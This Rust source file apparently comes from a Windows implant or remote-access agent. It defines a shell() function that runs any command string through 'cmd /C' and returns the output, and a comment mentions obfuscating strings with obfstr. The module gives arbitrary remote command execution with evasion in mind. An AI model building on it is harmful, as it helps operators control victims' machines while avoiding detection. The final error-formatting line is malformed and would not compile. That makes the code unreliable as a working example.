use fmtools::format; // using obfstr to obfuscate
use std::process::Command;
use std::string::String;

pub(crate) fn shell(command: &str) -> String {
    if command.is_empty() {
        return format!("Invalid number of arguments received. Usage: 'shell [command]'.");
    }

    match Command::new("cmd")
        .args(["/C", command])
        .output()
        {
        Ok(output) => {
            match output.stdout.len() {
                0 => format!("Command executed successfully."),
                _ => String::from_utf8_lossy(&output.stdout).to_string()
            }
        },
        Err(e) => format!("Failed to execute command: "{e}),
    }
}